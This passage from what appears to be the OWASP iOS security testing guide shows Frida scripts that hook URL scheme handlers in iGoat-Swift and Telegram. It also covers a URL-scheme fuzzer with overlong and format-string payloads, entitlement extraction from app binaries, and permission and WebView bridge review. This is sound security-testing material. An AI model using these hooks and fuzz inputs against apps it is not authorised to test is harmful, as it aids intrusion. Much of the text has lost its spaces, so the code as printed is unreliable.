Ifyoupress“Call”itwillopenthePhoneappanddirectlymakethecall. YoumayalsoknowalreadyaboutpagesthattriggercustomURLschemes,youcanjustnavigatenormallytothosepages andSafariwillautomaticallyaskwhenitfindsacustomURLscheme. 459\nUsing the Notes App As already seen in “Triggering Universal Links”, you may use the Notes app and long press the links you’ve written in ordertotestcustomURLschemes. Remembertoexittheeditingmodeinordertobeabletoopenthem. Notethatyou canclickorlongpresslinksincludingcustomURLschemesonlyiftheappisinstalled,ifnottheywon’tbehighlightedas clickablelinks. Using Frida IfyousimplywanttoopentheURLschemeyoucandoitusingFrida: $frida -UiGoat-Swift [iPhone::iGoat-Swift]->function openURL(url){ varUIApplication =ObjC.classes.UIApplication.sharedApplication(); vartoOpen =ObjC.classes.NSURL.URLWithString_(url); return UIApplication.openURL_(toOpen); } [iPhone::iGoat-Swift]->openURL("tel://234234234") true InthisexamplefromFridaCodeSharetheauthorusesthenon-publicAPILSApplicationWorkspace.openSensitiveURL:withOptions: toopentheURLs(fromtheSpringBoardapp): function openURL(url){ varw=ObjC.classes.LSApplicationWorkspace.defaultWorkspace(); vartoOpen =ObjC.classes.NSURL.URLWithString_(url); return w.openSensitiveURL_withOptions_(toOpen,null); } Notethattheuseofnon-publicAPIsisnotpermittedontheAppStore,that’swhywedon’teventestthesebutwe areallowedtousethemforourdynamicanalysis. Identifying and Hooking the URL Handler Method Ifyoucan’tlookintotheoriginalsourcecodeyouwillhavetofindoutyourselfwhichmethoddoestheappusetohandle theURLschemerequeststhatitreceives. YoucannotknowifitisanObjective-CmethodoraSwiftone,orevenifthe appisusingadeprecatedone. Crafting the Link Yourself and Letting Safari Open It ForthiswewillusetheObjCmethodobserverfromFridaCodeShare,whichisanextremelyhandyscriptthatallowsyou toquicklyobserveanycollectionofmethodsorclassesjustbyprovidingasimplepattern. Inthiscaseweareinterestedintoallmethodscontaining“openURL”,thereforeourpatternwillbe*[* *openURL*]: • Thefirstasteriskwillmatchallinstance-andclass+methods. • ThesecondmatchesallObjective-Cclasses. • ThethirdandforthallowtomatchanymethodcontainingthestringopenURL. $frida -UiGoat-Swift --codesharemrmacete/objc-method-observer [iPhone::iGoat-Swift]->observeSomething("*[**openURL*]"); Observing -[_UIDICActivityItemProvideractivityViewController:openURLAnnotationForActivityType:] Observing -[CNQuickActionsManager_openURL:] Observing -[SUClientControlleropenURL:] Observing -[SUClientControlleropenURL:inClientWithIdentifier:] Observing -[FBSSystemServiceopenURL:application:options:clientPort:withResult:] Observing -[iGoat_Swift.AppDelegate application:openURL:options:] Observing -[PrefsUILinkLabelopenURL:] Observing -[UIApplicationopenURL:] Observing -[UIApplication_openURL:] Observing -[UIApplicationopenURL:options:completionHandler:] Observing -[UIApplicationopenURL:withCompletionHandler:] Observing -[UIApplication_openURL:originatingView:completionHandler:] Observing -[SUApplicationapplication:openURL:sourceApplication:annotation:] ... 460\nThelistisverylongandincludesthemethodswehavealreadymentioned. IfwetriggernowoneURLscheme,forexample “igoat://”fromSafariandaccepttoopenitintheappwewillseethefollowing: [iPhone::iGoat-Swift]->(0x1c4038280) -[iGoat_Swift.AppDelegate application:openURL:options:] application:<UIApplication:0x101d0fad0> openURL:igoat:// options:{ UIApplicationOpenURLOptionsOpenInPlaceKey =0; UIApplicationOpenURLOptionsSourceApplicationKey ="com.apple.mobilesafari"; } 0x18b5030d8 UIKit!__58-[UIApplication_applicationOpenURLAction:payload:origin:]_block_invoke 0x18b502a94 UIKit!-[UIApplication_applicationOpenURLAction:payload:origin:] ... 0x1817e1048 libdispatch.dylib!_dispatch_client_callout 0x1817e86c8 libdispatch.dylib!_dispatch_block_invoke_direct$VARIANT$mp 0x18453d9f4 FrontBoardServices!__FBSSERIALQUEUE_IS_CALLING_OUT_TO_A_BLOCK__ 0x18453d698 FrontBoardServices!-[FBSSerialQueue_performNext] RET:0x1 Nowweknowthat: • Themethod-[iGoat_Swift.AppDelegateapplication:openURL:options:] getscalled. Aswehaveseenbefore, itistherecommendedwayanditisnotdeprecated. • ItreceivesourURLasaparameter: igoat://. • Wealsocanverifythesourceapplication: com.apple.mobilesafari. • We can also know from where it was called, as expected from -[UIApplication _applicationOpenURLAc- tion:payload:origin:]. • Themethodreturns0x1whichmeansYES(thedelegatesuccessfullyhandledtherequest). ThecallwassuccessfulandweseenowthattheiGoatappwasopen: 461\nNotice that we can also see that the caller (source application) was Safari if we look in the upper-left corner of the screenshot. Dynamically Opening the Link from the App Itself It is also interesting to see which other methods get called on the way. To change the result a little bit we will call the sameURLschemefromtheiGoatappitself. WewilluseagainObjCmethodobserverandtheFridaREPL: $frida -UiGoat-Swift --codesharemrmacete/objc-method-observer [iPhone::iGoat-Swift]->function openURL(url){ varUIApplication =ObjC.classes.UIApplication.sharedApplication(); 462\nvartoOpen =ObjC.classes.NSURL.URLWithString_(url); return UIApplication.openURL_(toOpen); } [iPhone::iGoat-Swift]->observeSomething("*[**openURL*]"); [iPhone::iGoat-Swift]->openURL("iGoat://?contactNumber=123456789&message=hola") (0x1c409e460) -[__NSXPCInterfaceProxy__LSDOpenProtocolopenURL:options:completionHandler:] openURL:iGoat://?contactNumber=123456789&message=hola options:nil completionHandler:<__NSStackBlock__:0x16fc89c38> 0x183befbec MobileCoreServices!-[LSApplicationWorkspaceopenURL:withOptions:error:] 0x10ba6400c ... RET:nil ... (0x101d0fad0) -[UIApplicationopenURL:] openURL:iGoat://?contactNumber=123456789&message=hola 0x10a610044 ... RET:0x1 true (0x1c4038280) -[iGoat_Swift.AppDelegate application:openURL:options:] application:<UIApplication:0x101d0fad0> openURL:iGoat://?contactNumber=123456789&message=hola options:{ UIApplicationOpenURLOptionsOpenInPlaceKey =0; UIApplicationOpenURLOptionsSourceApplicationKey ="OWASP.iGoat-Swift"; } 0x18b5030d8 UIKit!__58-[UIApplication_applicationOpenURLAction:payload:origin:]_block_invoke 0x18b502a94 UIKit!-[UIApplication_applicationOpenURLAction:payload:origin:] ... RET:0x1 The output is truncated for better readability. This time you see that UIApplicationOpenURLOptionsSourceApplica- tionKeyhaschangedtoOWASP.iGoat-Swift,whichmakessense. Inaddition,alonglistofopenURL-likemethodswere called. Considering this information can be very useful for some scenarios as it will help you to decide what you next stepswillbe,e.g.whichmethodyouwillhookortamperwithnext. Opening a Link by Navigating to a Page and Letting Safari Open It You can now test the same situation when clicking on a link contained on a page. Safari will identify and process the URL scheme and choose which action to execute. Opening this link “https://telegram.me/fridadotre” will trigger this behavior. 463\nFirstofallweletfrida-tracegeneratethestubsforus: $frida-trace -UTelegram -m"*[**restorationHandler*]" -i"*open*Url*" -m"*[**application*URL*]" -m"*[*openURL]" ... 7310ms -[UIApplication _applicationOpenURLAction:0x1c44ff900payload:0x10c5ee4c0origin:0x0] 7311ms |-[AppDelegateapplication:0x105a59980openURL:0x1c46ebb80options:0x1c0e222c0] 7312ms |$S10TelegramUI15openExternalUrl7account7context3url05forceD016presentationData 18applicationContext20navigationController12dismissInputy0A4Core7AccountC_AA14Open URLContextOSSSbAA012PresentationK0CAA0a11ApplicationM0C7Display010NavigationO0CSgyyctF() Nowwecansimplymodifybyhandthestubsweareinterestedin: • TheObjective-Cmethodapplication:openURL:options:: //__handlers__/__AppDelegate_application_openUR_3679fadc.js onEnter:function (log,args,state){ log("-[AppDelegateapplication: " +args[2]+ "openURL: " +args[3]+"options:" +args[4]+"]"); log("\tapplication:" +ObjC.Object(args[2]).toString()); 464\nlog("\topenURL:" +ObjC.Object(args[3]).toString()); log("\toptions:" +ObjC.Object(args[4]).toString()); }, • TheSwiftmethod$S10TelegramUI15openExternalUrl...: //__handlers__/TelegramUI/_S10TelegramUI15openExternalUrl7_b1a3234e.js onEnter:function (log,args,state){ log("TelegramUI.openExternalUrl(account,url, presentationData," + "applicationContext,navigationController, dismissInput)"); log("\taccount:" +ObjC.Object(args[1]).toString()); log("\turl:" +ObjC.Object(args[2]).toString()); log("\tpresentationData:" +args[3]); log("\tapplicationContext:" +ObjC.Object(args[4]).toString()); log("\tnavigationController:" +ObjC.Object(args[5]).toString()); }, Thenexttimewerunit,weseethefollowingoutput: $frida-trace -UTelegram -m"*[**restorationHandler*]" -i"*open*Url*" -m"*[**application*URL*]" -m"*[*openURL]" 8144 ms -[UIApplication_applicationOpenURLAction:0x1c44ff900 payload:0x10c5ee4c0 origin:0x0] 8145 ms |-[AppDelegateapplication:0x105a59980 openURL:0x1c46ebb80 options:0x1c0e222c0] 8145 ms | application:<Application:0x105a59980> 8145 ms | openURL:tg://resolve?domain=fridadotre 8145 ms | options :{ UIApplicationOpenURLOptionsOpenInPlaceKey =0; UIApplicationOpenURLOptionsSourceApplicationKey ="com.apple.mobilesafari"; } 8269 ms | |TelegramUI.openExternalUrl(account,url,presentationData, applicationContext,navigationController,dismissInput) 8269 ms | | account:nil 8269 ms | | url:tg://resolve?domain=fridadotre 8269 ms | | presentationData:0x1c4c51741 8269 ms | | applicationContext:nil 8269 ms | | navigationController:TelegramUI.PresentationData 8274 ms |-[UIApplicationapplicationOpenURL:0x1c46ebb80] Thereyoucanobservethefollowing: • Itcallsapplication:openURL:options: fromtheappdelegateasexpected. • ThesourceapplicationisSafari(“com.apple.mobilesafari”). • application:openURL:options: handlestheURLbutdoesnotopenit,itcallsTelegramUI.openExternalUrlfor that. • TheURLbeingopenedistg://resolve?domain=fridadotre. • Itusesthetg://customURLschemefromTelegram. Itisinterestingtoseethatifyounavigateagainto“https://telegram.me/fridadotre”,clickoncancelandthenclickon thelinkofferedbythepageitself(“OpenintheTelegramapp”),insteadofopeningviacustomURLschemeitwillopen viauniversallinks. 465\nYoucantrythiswhiletracingbothmethods: $frida-trace -UTelegram -m"*[**restorationHandler*]" -m"*[**application*openURL*options*]" //Afterclicking"Open"onthepop-up 16374 ms -[AppDelegateapplication :0x10556b3c0 openURL :0x1c4ae0080 options :0x1c7a28400] 16374 ms application :<Application:0x10556b3c0> 16374 ms openURL :tg://resolve?domain=fridadotre 16374 ms options :{ UIApplicationOpenURLOptionsOpenInPlaceKey =0; UIApplicationOpenURLOptionsSourceApplicationKey ="com.apple.mobilesafari"; } //Afterclicking"Cancel"onthepop-upand"OPEN"inthepage 406575 ms -[AppDelegateapplication:0x10556b3c0 continueUserActivity:0x1c063d0c0 restorationHandler:0x16f27a898] 406575 ms application:<Application:0x10556b3c0> 406575 ms continueUserActivity:<NSUserActivity:0x1c063d0c0> 406575 ms webpageURL:https://telegram.me/fridadotre 406575 ms activityType:NSUserActivityTypeBrowsingWeb 406575 ms userInfo:{ } 406575 ms restorationHandler:<__NSStackBlock__:0x16f27a898> 466\nTesting for Deprecated Methods Searchfordeprecatedmethodslike: • application:handleOpenURL: • openURL: • application:openURL:sourceApplication:annotation: Youmaysimplyusefrida-traceforthis,toseeifanyofthosemethodsarebeingused. Testing URL Schemes Source Validation A way to discard or confirm validation could be by hooking typical methods that might be used for that. For example isEqualToString:: //-(BOOL)isEqualToString:(NSString*)aString; varisEqualToString =ObjC.classes.NSString["-isEqualToString:"]; Interceptor.attach(isEqualToString.implementation,{ onEnter:function(args){ varmessage =ObjC.Object(args[2]); console.log(message) } }); IfweapplythishookandcalltheURLschemeagain: $frida -UiGoat-Swift [iPhone::iGoat-Swift]->varisEqualToString =ObjC.classes.NSString["-isEqualToString:"]; Interceptor.attach(isEqualToString.implementation,{ onEnter:function(args){ varmessage =ObjC.Object(args[2]); console.log(message) } }); {} [iPhone::iGoat-Swift]->openURL("iGoat://?contactNumber=123456789&message=hola") true nil Nothinghappens. Thistellsusalreadythatthismethodis notbeingusedfor thataswecannot findanyapp-package- lookingstringlikeOWASP.iGoat-Swiftorcom.apple.mobilesafaribetweenthehookandthetextofthetweet. However, considerthatwearejustprobingonemethod,theappmightbeusingotherapproachforthecomparison. Fuzzing URL Schemes IftheappparsespartsoftheURL,youcanalsoperforminputfuzzingtodetectmemorycorruptionbugs. Whatwehavelearnedabovecanbenowusedtobuildyourownfuzzeronthelanguageofyourchoice, e.g.inPython andcalltheopenURLusingFrida’sRPC.Thatfuzzershoulddothefollowing: • Generatepayloads. • ForeachofthemcallopenURL. • Checkiftheappgeneratesacrashreport(.ips)in/private/var/mobile/Library/Logs/CrashReporter. TheFuzzDBprojectoffersfuzzingdictionariesthatyoucanuseaspayloads. 467\nUsing Frida Doing this with Frida is pretty easy, as explained in this blog post to see an example that fuzzes the iGoat-Swift app (workingoniOS11.1.2). BeforerunningthefuzzerweneedtheURLschemesasinputs. FromthestaticanalysisweknowthattheiGoat-Swiftapp supportsthefollowingURLschemeandparameters: iGoat://?contactNumber={0}&message={0}. $frida -USpringBoard -lios-url-scheme-fuzzing.js [iPhone::SpringBoard]->fuzz("iGoat","iGoat://?contactNumber={0}&message={0}") WatchingforcrashesfromiGoat... Nologsweremoved. OpenedURL:iGoat://?contactNumber=0&message=0 OK! OpenedURL:iGoat://?contactNumber=1&message=1 OK! OpenedURL:iGoat://?contactNumber=-1&message=-1 OK! OpenedURL:iGoat://?contactNumber=null&message=null OK! OpenedURL:iGoat://?contactNumber=nil&message=nil OK! OpenedURL:iGoat://?contactNumber=99999999999999999999999999999999999 &message=99999999999999999999999999999999999 OK! OpenedURL:iGoat://?contactNumber=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ... &message=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ... OK! OpenedURL:iGoat://?contactNumber=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ... &message=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ... OK! OpenedURL:iGoat://?contactNumber='&message=' OK! OpenedURL:iGoat://?contactNumber=%20d&message=%20d OK! OpenedURL:iGoat://?contactNumber=%20n&message=%20n OK! OpenedURL:iGoat://?contactNumber=%20x&message=%20x OK! OpenedURL:iGoat://?contactNumber=%20s&message=%20s OK! Thescriptwilldetectifacrashoccurred. Onthisrunitdidnotdetectanycrashedbutforotherappsthiscouldbethe case. Wewouldbeabletoinspectthecrashreportsin/private/var/mobile/Library/Logs/CrashReporterorin/tmp ifitwasmovedbythescript. Checking for Sensitive Data Disclosed Through the User Interface Platform: ios MASVSV1: MSTG-STORAGE-7 MASVSV2: MASVS-PLATFORM-3 Overview Static Analysis Atextfieldthatmasksitsinputcanbeconfiguredintwoways: 468\nStoryboardIntheiOSproject’sstoryboard,navigatetotheconfigurationoptionsforthetextfieldthattakessensitive data. Makesurethattheoption“SecureTextEntry”isselected. Ifthisoptionisactivated,dotsareshowninthetextfield inplaceofthetextinput. SourceCodeIfthetextfieldisdefinedinthesourcecode,makesurethattheoptionisSecureTextEntryissetto“true”. Thisoptionobscuresthetextinputbyshowingdots. sensitiveTextField.isSecureTextEntry =true Dynamic Analysis Todeterminewhethertheapplicationleaksanysensitiveinformationtotheuserinterface,runtheapplicationandidentify componentsthateithershowsuchinformationortakeitasinput. Iftheinformationismaskedby,forexample,asterisksordots,theappisn’tleakingdatatotheuserinterface. Testing App Permissions Platform: ios MASVSV1: MSTG-PLATFORM-1 MASVSV2: MASVS-PLATFORM-1 Overview Static Analysis SinceiOS10,thesearethemainareaswhichyouneedtoinspectforpermissions: • PurposeStringsintheInfo.plistFile • CodeSigningEntitlementsFile • EmbeddedProvisioningProfileFile • EntitlementsEmbeddedintheCompiledAppBinary • SourceCodeInspection Review application source code Ifhavingtheoriginalsourcecode,youcanverifythepermissionsincludedintheInfo.plistfile: • OpentheprojectwithXcode. • FindandopentheInfo.plistfileinthedefaulteditorandsearchforthekeysstartingwith"Privacy -". Youmayswitchtheviewtodisplaytherawvaluesbyright-clickingandselecting“ShowRawKeys/Values”(thiswayfor example "Privacy - Location When In Use Usage Description" will turn into NSLocationWhenInUseUsageDescrip- tion). 469\nReview Info.plist IfonlyhavingtheIPA: • UnziptheIPA. • TheInfo.plistislocatedinPayload/<appname>.app/Info.plist. • Convert it if needed (e.g. plutil -convert xml1 Info.plist) as explained in the chapter “iOS Basic Security Testing”,section“TheInfo.plistFile”. • InspectallpurposestringsInfo.plistkeys,usuallyendingwithUsageDescription: <plist version="1.0"> <dict> <key>NSLocationWhenInUseUsageDescription</key> <string>Yourlocation isusedtoprovideturn-by-turndirectionstoyourdestination.</string> ForeachpurposestringintheInfo.plistfile,checkifthepermissionmakessense. Forexample,imaginethefollowinglineswereextractedfromaInfo.plistfileusedbyaSolitairegame: <key>NSHealthClinicalHealthRecordsShareUsageDescription</key> <string>Shareyourhealthdatawithus!</string> <key>NSCameraUsageDescription</key> <string>Wewanttoaccessyourcamera</string> Itshouldbesuspiciousthataregularsolitairegamerequeststhiskindofresourceaccessasitprobablydoesnothave anyneedforaccessingthecameranorauser’shealth-records. Apartfromsimplycheckingif thepermissionsmakesense, furtheranalysissteps mightbederivedfromanalyzingpur- posestringse.g.iftheyarerelatedtostoragesensitivedata. Forexample,NSPhotoLibraryUsageDescriptioncanbe consideredasastoragepermissiongivingaccesstofilesthatareoutsideoftheapp’ssandboxandmightalsobeacces- sible by other apps. In this case, it should be tested that no sensitive data is being stored there (photos in this case). ForotherpurposestringslikeNSLocationAlwaysUsageDescription,itmustbealsoconsiderediftheappisstoringthis datasecurely. Refertothe“TestingDataStorage”chapterformoreinformationandbestpracticesonsecurelystoring sensitivedata. Review Embedded Provisioning Profile File Whenyoudonothavetheoriginalsourcecode,youshouldanalyzetheIPAandsearchinsidefortheembeddedprovision- ingprofilethatisusually locatedin therootappbundle folder(Payload/<appname>.app/)underthe name embedded. mobileprovision. Thisfileisnot a.plist, it isencodedusingCryptographicMessageSyntax. On macOSyoucaninspectanembedded provisioningprofile’sentitlementsusingthefollowingcommand: securitycms -D-iembedded.mobileprovision andthensearchfortheEntitlementskeyregion(<key>Entitlements</key>). Review Entitlements Embedded in the Compiled App Binary If you only have the app’s IPA or simply the installed app on a jailbroken device, you normally won’t be able to find .entitlements files. This could be also the case for the embedded.mobileprovision file. Still, you should be able to extracttheentitlementspropertylistsfromtheappbinaryyourself(whichyou’vepreviouslyobtainedasexplainedinthe “iOSBasicSecurityTesting”chapter,section“AcquiringtheAppBinary”). Thefollowingstepsshouldworkevenwhentargetinganencryptedbinary. Ifforsomereasontheydon’t,you’llhaveto decryptandextracttheappwithe.g.Clutch(ifcompatiblewithyouriOSversion),frida-ios-dumporsimilar. Extracting the Entitlements Plist from the App Binary Ifyouhavetheappbinaryonyourcomputer,oneapproachistousebinwalktoextract(-e)allXMLfiles(-y=xml): 470\n$binwalk -e-y=xml./Telegram\X DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 1430180 0x15D2A4 XMLdocument,version: "1.0" 1458814 0x16427E XMLdocument,version: "1.0" Oryoucanuseradare2(-qctoquietlyrunonecommandandexit)tosearchallstringsontheappbinary(izz)containing “PropertyList”(~PropertyList): $r2 -qc'izz~PropertyList' ./Telegram\X 0x0015d2a4ascii <?xmlversion="1.0" encoding="UTF-8" standalone="yes"?>\n<!DOCTYPEplistPUBLIC "-//Apple//DTDPLIST1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n<plistversion="1.0"> ...<key>com.apple.security.application-groups</key>\n\t\t<array> \n\t\t\t<string>group.ph.telegra.Telegraph</string>... 0x0016427dasciiH<?xmlversion="1.0" encoding="UTF-8"?>\n<!DOCTYPEplistPUBLIC "-//Apple//DTDPLIST1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n<plistversion="1.0">\n <dict>\n\t<key>cdhashes</key>... In both cases (binwalk or radare2) we were able to extract the same two plist files. If we inspect the first one (0x0015d2a4)weseethatwewereabletocompletelyrecovertheoriginalentitlementsfilefromTelegram. Note: thestringscommandwillnothelphereasitwillnotbeabletofindthisinformation. Betterusegrepwith the-aflagdirectlyonthebinaryoruseradare2(izz)/rabin2(-zz). Ifyouaccesstheappbinaryonthejailbrokendevice(e.gviaSSH),youcanusegrepwiththe-a, --textflag(treatsall filesasASCIItext): $grep -a-A5'PropertyList' /var/containers/Bundle/Application/ 15E6A58F-1CA7-44A4-A9E0-6CA85B65FA35/TelegramX.app/Telegram\X <!DOCTYPEplistPUBLIC "-//Apple//DTDPLIST1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0"> <dict> <key>com.apple.security.application-groups</key> <array> ... Play with the -A num, --after-context=num flag to display more or less lines. You may use tools like the ones we presentedaboveaswell,ifyouhavethemalsoinstalledonyourjailbrokeniOSdevice. Thismethodshouldworkeveniftheappbinaryisstillencrypted(itwastestedagainstseveralAppStoreapps). Source Code Inspection After having checked the <appname>.entitlements file and the Info.plist file, it is time to verify how the requested permissionsandassignedcapabilitiesareputtouse. Forthis,asourcecodereviewshouldbeenough. However,ifyou don’thavetheoriginalsourcecode,verifyingtheuseofpermissionsmightbespeciallychallengingasyoumightneedto reverseengineertheapp,refertothe“DynamicAnalysis”formoredetailsonhowtoproceed. Whendoingasourcecodereview,payattentionto: • whetherthepurposestringsintheInfo.plistfilematchtheprogrammaticimplementations. • whethertheregisteredcapabilitiesareusedinsuchawaythatnoconfidentialinformationisleaking. Userscangrantorrevokeauthorizationatanytimevia“Settings”,thereforeappsnormallychecktheauthorizationstatus ofafeaturebeforeaccessingit. ThiscanbedonebyusingdedicatedAPIsavailableformanysystemframeworksthat provideaccesstoprotectedresources. YoucanusetheAppleDeveloperDocumentationasastartingpoint. Forexample: • Bluetooth: the state property of the CBCentralManager class is used to check system-authorization status for usingBluetoothperipherals. • Location: searchformethodsofCLLocationManager,e.g.locationServicesEnabled. 471\nfunccheckForLocationServices() { ifCLLocationManager.locationServicesEnabled() { //Location servicesareavailable,soquerytheuser’slocation. }else { //Update yourapp’sUItoshowthatthelocationisunavailable. } } SeeTable1in“DeterminingtheAvailabilityofLocationServices”(AppleDeveloperDocumentation)foracomplete list. GothroughtheapplicationsearchingforusagesoftheseAPIsandcheckwhathappenstosensitivedatathatmightbe obtained from them. For example, it might be stored or transmitted over the network, if this is the case, proper data protectionandtransportsecurityshouldbeadditionallyverified. Dynamic Analysis With help of the static analysis you should already have a list of the included permissions and app capabilities in use. However, as mentioned in “Source Code Inspection”, spotting the sensitive data and APIs related to those permissions and app capabilities might be a challenging task when you don’t have the original source code. Dynamic analysis can helpheregettinginputstoiterateontothestaticanalysis. FollowinganapproachliketheonepresentedbelowshouldhelpyouspottingthementionedsensitivedataandAPIs: 1. Consider the list of permissions / capabilities identified in the static analysis (e.g. NSLocationWhenI- nUseUsageDescription). 2. MapthemtothededicatedAPIsavailableforthecorrespondingsystemframeworks(e.g.CoreLocation). Youmay usetheAppleDeveloperDocumentationforthis. 3. TraceclassesorspecificmethodsofthoseAPIs(e.g.CLLocationManager),forexample,usingfrida-trace. 4. Identify which methods are being really used by the app while accessing the related feature (e.g. “Share your location”). 5. Getabacktraceforthosemethodsandtrytobuildacallgraph. Onceallmethodswereidentified,youmightusethisknowledgetoreverseengineertheappandtrytofindouthowthe dataisbeinghandled. Whiledoingthatyoumightspotnewmethodsinvolvedintheprocesswhichyoucanagainfeed tostep3. aboveandkeepiteratingbetweenstaticanddynamicanalysis. InthefollowingexampleweuseTelegramtoopenthesharedialogfromachatandfrida-tracetoidentifywhichmethods arebeingcalled. First we launch Telegram and start a trace for all methods matching the string “authorizationStatus” (this is a general approachbecausemoreclassesapartfromCLLocationManagerimplementthismethod): frida-trace -U"Telegram" -m"*[**authorizationStatus*]" -U connects to the USB device. -m includes an Objective-C method to the traces. You can use a glob pattern (e.g. with the “*” wildcard, -m "*[* *authorizationStatus*]" means “include any Objective-C method of any classcontaining‘authorizationStatus’”). Typefrida-trace -hformoreinformation. Nowweopenthesharedialog: 472\nThefollowingmethodsaredisplayed: 1942ms +[PHPhotoLibraryauthorizationStatus] 1959ms +[TGMediaAssetsLibraryauthorizationStatusSignal] 1959ms |+[TGMediaAssetsModernLibraryauthorizationStatusSignal] IfweclickonLocation,anothermethodwillbetraced: 11186ms +[CLLocationManagerauthorizationStatus] 11186ms |+[CLLocationManager_authorizationStatus] 11186ms | |+[CLLocationManager_authorizationStatusForBundleIdentifier:0x0bundle:0x0] Use the auto-generated stubs of frida-trace to get more information like the return values and a backtrace. Do the followingmodificationstotheJavaScriptfilebelow(thepathisrelativetothecurrentdirectory): 473\n//__handlers__/__CLLocationManager_authorizationStatus_.js onEnter:function (log,args,state){ log("+[CLLocationManagerauthorizationStatus]"); log("Calledfrom:\n"+ Thread.backtrace(this.context,Backtracer.ACCURATE) .map(DebugSymbol.fromAddress).join("\n\t")+"\n"); }, onLeave:function (log,retval,state){ console.log('RET:' +retval.toString()); } Clickingagainon“Location”revealsmoreinformation: 3630ms -[CLLocationManager init] 3630ms |-[CLLocationManagerinitWithEffectiveBundleIdentifier:0x0bundle:0x0] 3634ms -[CLLocationManager setDelegate:0x14c9ab000] 3641ms +[CLLocationManagerauthorizationStatus] RET:0x4 3641ms Calledfrom: 0x1031aa158TelegramUI!+[TGLocationUtilsrequestWhenInUserLocationAuthorizationWithLocationManager:] 0x10337e2c0TelegramUI!-[TGLocationPickerControllerinitWithContext:intent:] 0x101ee93acTelegramUI!0x1013ac Weseethat+[CLLocationManager authorizationStatus]returned0x4(CLAuthorizationStatus.authorizedWhenInUse) and was called by +[TGLocationUtils requestWhenInUserLocationAuthorizationWithLocationManager:]. As we anticipatedbefore,youmightusethiskindofinformationasanentrypointwhenreverseengineeringtheappandfrom theregetinputs(e.g.namesofclassesormethods)tokeepfeedingthedynamicanalysis. Next,thereisavisualwaytoinspectthestatusofsomeapppermissionswhenusingtheiPhone/iPadbyopening“Settings” andscrollingdownuntilyoufindtheappyou’reinterestedin. Whenclickingonit,thiswillopenthe“ALLOWAPP_NAME TOACCESS”screen. However, notallpermissionsmightbedisplayedyet. Youwillhavetotriggertheminordertobe listedonthatscreen. Forexample,inthepreviousexample,the“Location”entrywasnotbeinglisteduntilwetriggeredthepermissiondialogue forthefirsttime. Oncewedidit,nomatterifweallowedtheaccessornot,thethe“Location”entrywillbedisplayed. Determining Whether Native Methods Are Exposed Through WebViews 474\nPlatform: ios MASVSV1: MSTG-PLATFORM-7 MASVSV2: MASVS-PLATFORM-2 Overview Static Analysis Testing UIWebView JavaScript to Native Bridges SearchforcodethatmapsnativeobjectstotheJSContextassociatedwithaWebViewandanalyzewhatfunctionalityit exposes,forexamplenosensitivedatashouldbeaccessibleandexposedtoWebViews. InObjective-C,theJSContextassociatedwithaUIWebViewisobtainedasfollows: [webViewvalueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"] Testing WKWebView JavaScript to Native Bridges VerifyifaJavaScripttonativebridgeexistsbysearchingforWKScriptMessageHandlerandcheckallexposedmethods. Thenverifyhowthemethodsarecalled. Thefollowingexamplefrom“Where’sMyBrowser?” demonstratesthis. FirstweseehowtheJavaScriptbridgeisenabled: func enableJavaScriptBridge(_enabled:Bool){ options_dict["javaScriptBridge"]?.value =enabled letuserContentController =wkWebViewConfiguration.userContentController userContentController.removeScriptMessageHandler(forName:"javaScriptBridge") ifenabled { letjavaScriptBridgeMessageHandler =JavaScriptBridgeMessageHandler() userContentController.add(javaScriptBridgeMessageHandler,name:"javaScriptBridge") } } 